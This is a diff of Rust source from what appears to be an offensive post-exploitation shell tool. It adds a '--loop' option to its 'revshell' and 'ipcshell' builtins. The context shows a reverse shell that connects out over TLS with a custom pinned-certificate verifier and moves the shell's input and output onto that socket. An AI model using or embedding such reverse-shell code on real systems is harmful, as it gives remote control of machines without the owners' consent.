@@ -141,12 +141,18 @@ pub fn curl(sh: &mut Shell, args: Arguments) -> Result<()> {
 pub fn revshell(sh: &mut Shell, args: Arguments) -> Result<()> {
     let matches = App::new("revshell")
         .setting(AppSettings::DisableVersion)
+        .arg(Arg::with_name("loop")
+            .short("l")
+            .long("loop")
+            .help("Explicitly execute main loop again")
+        )
         .arg(Arg::with_name("addr").required(true))
         .arg(Arg::with_name("fingerprint").required(true))
         .get_matches_from_safe(args)?;
 
     let addr: SocketAddr = matches.value_of("addr").unwrap().parse()?;
     let fingerprint = matches.value_of("fingerprint").unwrap();
+    let run_loop = matches.occurrences_of("loop") > 0;
 
     let mut config = ClientConfig::new();
     config.dangerous().set_certificate_verifier(Arc::new(crypto::danger::PinnedCertificateVerification {}));
@@ -169,6 +175,10 @@ pub fn revshell(sh: &mut Shell, args: Arguments) -> Result<()> {
     sh.hotswap(Interface::Tls(sock));
     shprintln!(sh, "[+] hot-swapped interface");
 
+    if run_loop {
+        sh.run();
+    }
+
     Ok(())
 }
 
@@ -177,10 +187,16 @@ pub fn revshell(sh: &mut Shell, args: Arguments) -> Result<()> {
 pub fn ipcshell(sh: &mut Shell, args: Arguments) -> Result<()> {
     let matches = App::new("ipcshell")
         .setting(AppSettings::DisableVersion)
+        .arg(Arg::with_name("loop")
+            .short("l")
+            .long("loop")
+            .help("Explicitly execute main loop again")
+        )
         .arg(Arg::with_name("path").required(true))
         .get_matches_from_safe(args)?;
 
     let path = matches.value_of("path").unwrap();
+    let run_loop = matches.occurrences_of("loop") > 0;
 
     shprintln!(sh, "[*] connecting to {}...", path);
     let sock = UnixStream::connect(&path)?;
@@ -190,6 +206,10 @@ pub fn ipcshell(sh: &mut Shell, args: Arguments) -> Result<()> {
     shprintln!(sh, "[*] see you on the other side...");
     sh.hotswap(Interface::Ipc(sock));
     shprintln!(sh, "[+] hot-swapped interface");
+
+    if run_loop {
+        sh.run();
+    }
 
     Ok(())
 }
